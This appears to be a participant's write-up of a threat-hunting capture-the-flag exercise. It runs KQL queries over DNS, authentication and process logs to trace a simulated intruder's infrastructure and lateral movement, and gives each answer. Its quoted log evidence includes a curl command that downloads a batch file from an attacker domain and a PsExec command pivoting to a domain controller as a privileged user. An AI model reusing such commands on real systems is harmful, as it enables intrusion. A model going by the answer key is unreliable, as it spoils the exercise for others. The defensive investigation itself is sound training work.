S1q12

Now let's go on a side-quest. We've found a domain, didn't we? Let's dive into that for a bit 🤿

Thanks to the PassiveDns table, we can find IP addresses related to that domain.

Which IP address contains 11 digits?

here the domain that we found

ProcessEvents
| where username   contains "IT_god_mode"
| where process_commandline  contains "z0mbytes.bat"

curl -s -O traintofokke.boo/n0mnom/z0mbytes.bat
2025-10-27T09:12:48.000Z

lets take this domain and see the IP 

traintofokke.boo

PassiveDns
| where domain contains "traintofokke.boo"
| where rdata matches regex @"^(\d{1,3}\.){3}\d{1,3}$"
| distinct rdata

51.81.42.234
206.188.196.20
162.33.177.56
103.199.16.92

select a IP with 11 digits 

PassiveDns
| where domain contains "traintofokke.boo"
| where rdata matches regex @"^(\d{1,3}\.){3}\d{1,3}$"
| where strlen(replace_string(rdata, ".", "")) == 11
| distinct rdata

//206.188.196.20

S1q13

And now we can dig deeper to see if there are any other domains linked to those IPs. We can go back and forth like that any number of time to discover the threat actor infrastructure. Here just doing it once will be enough.

What other domain did you find? Answer with only one of them.


PassiveDns
| where rdata contains "206.188.196.20"
|distinct domain

yummybrains.food
allyourportarebelongto.us
traintofokke.boo


S1q14

This sidequest is useful, because now we can check if any of those IP addresses have been used to log into the domain controller!

How many results did you get?

let A=
PassiveDns
| where domain contains "traintofokke.boo"
| where rdata matches regex @"^(\d{1,3}\.){3}\d{1,3}$"
| distinct rdata;
AuthenticationEvents
| where src_ip has_any (A)
//1

10/25/2025, 7:56:03 AM	EWSI-LAPTOP	162.33.177.56	Mozilla/5.0 (X11; Linux x86_64; rv:1.9.5.20) Gecko/2016-11-30 03:32:34 Firefox/3.8	anbonny	Successful Login	1a743b860c405864f1eafcbdb6bc9c92	A user attempted to log into a host


s1q15

But, wait, that's not the domain controller…

What username was logged into by one of the malicious IP addresses?

let A=
PassiveDns
| where domain contains "traintofokke.boo"
| where rdata matches regex @"^(\d{1,3}\.){3}\d{1,3}$"
| distinct rdata;
AuthenticationEvents
| where src_ip has_any (A)

///anbonny

10/25/2025, 7:56:03 AM

Mozilla/5.0 (X11; Linux x86_64; rv:1.9.5.20) Gecko/2016-11-30 03:32:34 Firefox/3.8

S1q16

Ha! So we've probably found how the threat actor got into the network. They compromised a user. Take note of the timestamp.

Now, there is another way to figure out if the threat actor logged into any other machines. We can pivot on the user-agent!

What is the third hostname they logged into?


user agent is Mozilla/5.0 (X11; Linux x86_64; rv:1.9.5.20) Gecko/2016-11-30 03:32:34 Firefox/3.8

AuthenticationEvents
| where user_agent contains "Mozilla/5.0 (X11; Linux x86_64; rv:1.9.5.20) Gecko/2016-11-30 03:32:34 Firefox/3.8"
| distinct hostname

DC_offices
DC_warehouses
EWSI-LAPTOP

the new hostname is // DC_warehouses

S1Q17

So they managed to compromise a second domain controller! The offices weren't enough for the threat actor, they needed to bring operation to a standstill.

Now, look at the IP address used to log into the domain controllers. It's clearly an internal address. And the username is that privileged user we saw used on the domain controller.

It seems pretty obvious that the IP address is belonging to anbonny, but let us just double check to confirm our hypothesis.

What is the full name of the compromised user?

let A=
AuthenticationEvents
| where user_agent contains "Mozilla/5.0 (X11; Linux x86_64; rv:1.9.5.20) Gecko/2016-11-30 03:32:34 Firefox/3.8"
| distinct src_ip;
Employees
| where ip_addr has_any (A)

7/24/2024, 12:00:00 AM	Anne Bonny	Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.3; Win64; x64; Trident/4.0)	10.10.18.1	anne_bonny@fokke.nl	anbonny	Logistics Manager	EWSI-LAPTOP	True	fokke.nl

full name is //Anne Bonny

S1Q18

It's safe to say we found our initial access. The threat actor compromised Anne Bonny, and from her machine managed to get to the domain controllers.

Let's have a look at the processes on her machine, to see if we can find exactly how they did that.

Which legitimate Windows sysinternal tool did they use to move from one machine to the other?
I search with AI to have a short list of the most common tool 


psexec.exe
psexesvc.exe
psservice.exe
psshutdown.exe
pspasswd.exe


ProcessEvents
| where process_commandline has_any (
    "psexec.exe",
    "psexesvc.exe",
    "psservice.exe",
    "psshutdown.exe",
    "Npspasswd.exe"
)
| where username contains "anbonny"
| distinct process_commandline

PSExec.exe \\10.10.16.3 -u IT_god_mode -p ***** cmd.exe

//PSExec.exe

